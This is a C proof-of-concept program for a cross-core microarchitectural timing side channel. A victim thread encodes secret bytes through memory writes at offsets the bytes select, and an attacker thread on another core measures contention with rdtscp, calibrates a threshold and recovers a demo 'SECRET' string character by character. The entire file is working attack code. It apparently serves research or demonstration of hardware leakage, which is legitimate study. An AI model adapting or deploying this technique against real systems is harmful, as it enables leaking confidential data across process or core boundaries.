#define _GNU_SOURCE
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sched.h>
#include <sys/mman.h>
#include <pthread.h>

#define DATA    "DATA|"

/* ----- Enter Secret Word Here ----- */
#define SECRET  "SECRET"
/* ---------------------------------- */

#define DATA_SECRET     DATA SECRET

#define A_ITS 250
#define V_ITS 500

#define GET_PTR(mem_ptr, data_byte) (mem_ptr + (((int)data_byte) << 6))

// Some shared data between attacker thread and set up thread
unsigned char *mem;
unsigned char data[128];
char leaked[sizeof(DATA_SECRET) + 1];
int THRESHOLD = 0;
int UPPER_THRESH = 0;
uint64_t thresh_time;
pthread_barrier_t att_vic_sync, arg_pass_sync, thresh_sync;

struct args {
	int victim_index;
	int test_char;
};

/* ---- Utility Funcs ---- */
static inline __attribute__((always_inline)) uint64_t rdtscp_begin()
{
	uint64_t a, d;
	asm volatile(
			"cpuid\n\t"
			"rdtscp\n\t"
			"mov %%rdx, %0\n\t"
			"mov %%rax, %1\n\t"
			: "=r" (d), "=r" (a)
			:
			: "%rax", "%rbx", "%rcx", "%rdx");
	return (d << 32) | a;
}	

static inline __attribute__((always_inline)) uint64_t rdtscp_end()
{
	uint64_t a, d;
	asm volatile(
			"rdtscp\n\t"
			"mov %%rdx, %0\n\t"
			"mov %%rax, %1\n\t"
			"cpuid\n\t"
			: "=r" (d), "=r" (a)
			:
			: "%rax", "%rbx", "%rcx", "%rdx"
		    );
	return (d << 32) | a;
}	

static inline __attribute__((always_inline)) void clflush(void *ptr) {
    asm volatile("clflush 0(%0)\n"
                    :
                    : "c" (ptr)
                    : "rax"
                    );
}

static inline __attribute__((always_inline)) void mfence() {
    asm volatile("mfence");
}

/* ---- Threshold Funcs ---- */

void *thresh_victim(void *args) {
	// Thread Setup //
	cpu_set_t cpuset;
	CPU_ZERO(&cpuset);
	CPU_SET(0, &cpuset);
	pthread_t thread;
	thread = pthread_self();
	int ret = pthread_setaffinity_np(thread, sizeof(cpu_set_t), &cpuset);
	if (ret != 0) {
		fprintf(stderr, "pthread_setaffinity_np() failed\n");
		exit(EXIT_FAILURE);
	}
	
	int vic_index = ((struct args *)args)->victim_index;
	unsigned char *p1 = GET_PTR(mem, vic_index);
	mfence();
	pthread_barrier_wait(&thresh_sync);	//wait for attacker to be ready
	for (int i = 0; i < V_ITS; i ++) {
		asm volatile (
			"mov %%r14, 0x0000(%0)\n\t"
			"mov %%r14, 0x1000(%0)\n\t"	
			"mov %%r14, 0x2000(%0)\n\t"
			"mov %%r14, 0x3000(%0)\n\t"	
			"mov %%r14, 0x4000(%0)\n\t"
			"mov %%r14, 0x5000(%0)\n\t"	
			"mov %%r14, 0x6000(%0)\n\t"
			"mov %%r14, 0x7000(%0)\n\t"
			"mov %%r14, 0x0000(%0)\n\t"
			"mov %%r14, 0x1000(%0)\n\t"	
			"mov %%r14, 0x2000(%0)\n\t"
			"mov %%r14, 0x3000(%0)\n\t"	
			"mov %%r14, 0x4000(%0)\n\t"
			"mov %%r14, 0x5000(%0)\n\t"	
			"mov %%r14, 0x6000(%0)\n\t"
			"mov %%r14, 0x7000(%0)\n\t"	
			"mov %%r14, 0x0000(%0)\n\t"
			"mov %%r14, 0x1000(%0)\n\t"	
			"mov %%r14, 0x2000(%0)\n\t"
			"mov %%r14, 0x3000(%0)\n\t"	
			"mov %%r14, 0x4000(%0)\n\t"
			"mov %%r14, 0x5000(%0)\n\t"	
			"mov %%r14, 0x6000(%0)\n\t"
			"mov %%r14, 0x7000(%0)\n\t"					
			: 
			: "r" (p1)
			: 
		);
	}
}

void *thresh_attacker(void *args) {
	// Thread Setup //
	cpu_set_t cpuset; 
	CPU_ZERO(&cpuset);
	CPU_SET(8, &cpuset);
	pthread_t thread;
	thread = pthread_self();
	int ret = pthread_setaffinity_np(thread, sizeof(cpu_set_t), &cpuset);
	if (ret != 0) {
		fprintf(stderr, "pthread_setaffinity_np() failed\n");
		exit(EXIT_FAILURE);
	}
	
	// Attacker Decoding Data //
	uint64_t start, end;

	int att_index = ((struct args *)args)->test_char;
	unsigned char *p1 = GET_PTR(mem + 0x1000, att_index);
	mfence();
	pthread_barrier_wait(&thresh_sync);	// wait for victim to be ready
	start = rdtscp_begin();
	for (int i = 0; i < A_ITS; i++) {
		asm volatile (
			"mov 0x0000(%0), %%r15\n\t"
			"mov 0x1000(%0), %%r15\n\t" 
			"mov 0x2000(%0), %%r15\n\t" 
			"mov 0x3000(%0), %%r15\n\t" 
			"mov 0x4000(%0), %%r15\n\t" 
			"mov 0x5000(%0), %%r15\n\t" 
			"mov 0x6000(%0), %%r15\n\t" 
			"mov 0x7000(%0), %%r15\n\t"
			"mov 0x0000(%0), %%r15\n\t"
			"mov 0x1000(%0), %%r15\n\t" 
			"mov 0x2000(%0), %%r15\n\t" 
			"mov 0x3000(%0), %%r15\n\t" 
			"mov 0x4000(%0), %%r15\n\t" 
			"mov 0x5000(%0), %%r15\n\t" 
			"mov 0x6000(%0), %%r15\n\t" 
			"mov 0x7000(%0), %%r15\n\t"
			"mov 0x0000(%0), %%r15\n\t"
			"mov 0x1000(%0), %%r15\n\t" 
			"mov 0x2000(%0), %%r15\n\t" 
			"mov 0x3000(%0), %%r15\n\t" 
			"mov 0x4000(%0), %%r15\n\t" 
			"mov 0x5000(%0), %%r15\n\t" 
			"mov 0x6000(%0), %%r15\n\t" 
			"mov 0x7000(%0), %%r15\n\t"
			: 
			: "r" (p1)
			: 
			);
		mfence();
	}
	end = rdtscp_end();
	
	thresh_time = (end - start) / A_ITS;
}


uint64_t contention_func() {
	pthread_t vic_thread, att_thread;
	struct args *arg = (struct args *)malloc(sizeof(struct args));
	
	arg->test_char = 32;
	arg->victim_index = 32;
	
	pthread_barrier_init(&thresh_sync, NULL, 2);
	pthread_create(&vic_thread, NULL, thresh_victim, (void *)arg);
	pthread_create(&att_thread, NULL, thresh_attacker, (void *)arg);
	pthread_join(att_thread, NULL);

	free(arg);
	
	return thresh_time;
}

uint64_t no_contention_func() {
	pthread_t vic_thread, att_thread;
	struct args *arg = (struct args *)malloc(sizeof(struct args));
	
	arg->test_char = 5;
	arg->victim_index = 32;
	
	pthread_barrier_init(&thresh_sync, NULL, 2);
	pthread_create(&vic_thread, NULL, thresh_victim, (void *)arg);
	pthread_create(&att_thread, NULL, thresh_attacker, (void *)arg);
	pthread_join(att_thread, NULL);
	
	free(arg);
	
	return thresh_time;
}

int detect_threshold() {
	uint64_t contention = 0, no_contention = 0, i, count = 10000;
	
	// Sampling Time With Contention
	for (i = 0; i < count; i++) {
		contention += contention_func();
	}
	
	// Sampling Time With No Contention
	for (i = 0; i < count; i++) {
		no_contention += no_contention_func();
	}
	
	// Averaging
	contention /= count;
	no_contention /= count;
	
	return (contention + no_contention) / 2;
}

/* ---- Victim Thread ---- */
void *victim(void *args) {
	// Thread Setup //
	cpu_set_t cpuset;
	CPU_ZERO(&cpuset);
	CPU_SET(0, &cpuset);
	pthread_t thread;
	thread = pthread_self();
	int ret = pthread_setaffinity_np(thread, sizeof(cpu_set_t), &cpuset);
	if (ret != 0) {
		fprintf(stderr, "pthread_setaffinity_np() failed\n");
		exit(EXIT_FAILURE);
	}
	
	// Victim Leaking Data //
	while(1) {
		// Access data[j], j = potential out of bounds
		pthread_barrier_wait(&arg_pass_sync);	//wait for new args to be ready
		int leak = ((struct args *)args)->victim_index;
		// Encode via Parallel Writes (last 12 bits based off data[j])
		unsigned char *p1 = GET_PTR(mem, data[leak]);
		mfence();
		pthread_barrier_wait(&att_vic_sync);	//wait for attacker to be ready
		for (int i = 0; i < V_ITS; i ++) {
			asm volatile (
				"mov %%r14, 0x0000(%0)\n\t"
				"mov %%r14, 0x1000(%0)\n\t"	
				"mov %%r14, 0x2000(%0)\n\t"
				"mov %%r14, 0x3000(%0)\n\t"	
				"mov %%r14, 0x4000(%0)\n\t"
				"mov %%r14, 0x5000(%0)\n\t"	
				"mov %%r14, 0x6000(%0)\n\t"
				"mov %%r14, 0x7000(%0)\n\t"
				"mov %%r14, 0x0000(%0)\n\t"
				"mov %%r14, 0x1000(%0)\n\t"	
				"mov %%r14, 0x2000(%0)\n\t"
				"mov %%r14, 0x3000(%0)\n\t"	
				"mov %%r14, 0x4000(%0)\n\t"
				"mov %%r14, 0x5000(%0)\n\t"	
				"mov %%r14, 0x6000(%0)\n\t"
				"mov %%r14, 0x7000(%0)\n\t"	
				"mov %%r14, 0x0000(%0)\n\t"
				"mov %%r14, 0x1000(%0)\n\t"	
				"mov %%r14, 0x2000(%0)\n\t"
				"mov %%r14, 0x3000(%0)\n\t"	
				"mov %%r14, 0x4000(%0)\n\t"
				"mov %%r14, 0x5000(%0)\n\t"	
				"mov %%r14, 0x6000(%0)\n\t"
				"mov %%r14, 0x7000(%0)\n\t"					
				:
				:  "r" (p1)
				: 
			);
		}
	}
}

/* ---- Attacker Thread ---- */
void *attacker(void *args) {
	// Thread Setup //
	cpu_set_t cpuset;
	CPU_ZERO(&cpuset);
	CPU_SET(8, &cpuset);
	pthread_t thread;
	thread = pthread_self();
	int ret = pthread_setaffinity_np(thread, sizeof(cpu_set_t), &cpuset);
	if (ret != 0) {
		fprintf(stderr, "pthread_setaffinity_np() failed\n");
		exit(EXIT_FAILURE);
	}
	
	// Attacker Decoding Data //
	uint64_t start, end;
	int leak_index;
	while(1) {
		// Test if i = data[j]
		pthread_barrier_wait(&arg_pass_sync);	// wait for new args to be ready
		int leak = ((struct args *)args)->test_char;
		leak_index = ((struct args *)args)->victim_index;
		unsigned char *p1 = GET_PTR(mem + 0x1000, leak);
		
		// Timing Contention of i
		mfence();
		pthread_barrier_wait(&att_vic_sync);	// wait for victim to be ready
		start = rdtscp_begin();
		for (int i = 0; i < A_ITS; i++) {
			asm volatile (
				"mov 0x0000(%0), %%r15\n\t"
				"mov 0x1000(%0), %%r15\n\t" 
				"mov 0x2000(%0), %%r15\n\t" 
				"mov 0x3000(%0), %%r15\n\t" 
				"mov 0x4000(%0), %%r15\n\t" 
				"mov 0x5000(%0), %%r15\n\t" 
				"mov 0x6000(%0), %%r15\n\t" 
				"mov 0x7000(%0), %%r15\n\t"
				"mov 0x0000(%0), %%r15\n\t"
				"mov 0x1000(%0), %%r15\n\t" 
				"mov 0x2000(%0), %%r15\n\t" 
				"mov 0x3000(%0), %%r15\n\t" 
				"mov 0x4000(%0), %%r15\n\t" 
				"mov 0x5000(%0), %%r15\n\t" 
				"mov 0x6000(%0), %%r15\n\t" 
				"mov 0x7000(%0), %%r15\n\t"
				"mov 0x0000(%0), %%r15\n\t"
				"mov 0x1000(%0), %%r15\n\t" 
				"mov 0x2000(%0), %%r15\n\t" 
				"mov 0x3000(%0), %%r15\n\t" 
				"mov 0x4000(%0), %%r15\n\t" 
				"mov 0x5000(%0), %%r15\n\t" 
				"mov 0x6000(%0), %%r15\n\t" 
				"mov 0x7000(%0), %%r15\n\t"
				: 
				: "r" (p1)
				: 
				);
			mfence();
		}
		end = rdtscp_end();
		
		uint64_t time = (end - start) / A_ITS;
			
		// Found data[j]!
		if (time > THRESHOLD && time < UPPER_THRESH) {
			if(leaked[leak_index] == ' ') {
				// Update leaked
				leaked[leak_index] = (char)leak;
				printf("\x1b[33m%s\x1b[0m\r", leaked);
				
			}
			fflush(stdout);
		}
	}
}

int main(int argc, char **argv) {
    /* ---- Set Up Window ---- */
    
	// Memory Space
	mem = (unsigned char *)mmap(NULL, 10 * 4096, 
			PROT_READ | PROT_WRITE,
			MAP_ANONYMOUS | MAP_PRIVATE | MAP_POPULATE, -1, 0);
	memset(mem, 0x80, 10 * 4096);
	
	// Secret Data To Target
	memset(data, ' ', sizeof(data));
    memcpy(data, DATA_SECRET, sizeof(DATA_SECRET));
    data[sizeof(data) / sizeof(data[0]) - 1] = '0';
    
	memset(leaked, ' ', sizeof(leaked));
	leaked[sizeof(DATA_SECRET)] = 0;

	// Finding Timing Threshold
	THRESHOLD = detect_threshold();
	UPPER_THRESH = (THRESHOLD * 5) / 4;
           
	// Starting Threads & Barriers
	pthread_t vic_thread, att_thread;
	struct args *arg = (struct args *)malloc(sizeof(struct args));
	
	pthread_barrier_init(&att_vic_sync, NULL, 2);
	pthread_barrier_init(&arg_pass_sync, NULL, 3);
	
	pthread_create(&vic_thread, NULL, victim, (void *)arg);
	pthread_create(&att_thread, NULL, attacker, (void *)arg);
	
    /* ---- Attack Window ---- */	
	// Leaking Data //
	int j = 0;
	while (1) {
		// Iterating Through Data_Secret Indexes (minus the end of string char)
		j = (j + 1) % (sizeof(DATA_SECRET) - 1);
		
		// Only secret data
		if(j >= sizeof(DATA) - 1) {
			// Victim Accessing data[j]
			arg->victim_index = j;
		
			// Test all possible values of data[j]
			for (int i = 64; i < 128; i ++) {
				// Start Running Attacking Thread With i
				arg->test_char = i;
				pthread_barrier_wait(&arg_pass_sync);
			}
		}
		
		// If Leaked = Secret, Done!
		if(!strncmp(leaked + sizeof(DATA) - 1, SECRET, sizeof(SECRET) - 1)) {
			break;
		}
	}
	
	printf("\n\x1b[1A[ ]\n\n[\x1b[32m>\x1b[0m] Done\n");

	// Thread Cleanup //
	pthread_cancel(att_thread);
	pthread_cancel(vic_thread);
	
	return EXIT_SUCCESS;
}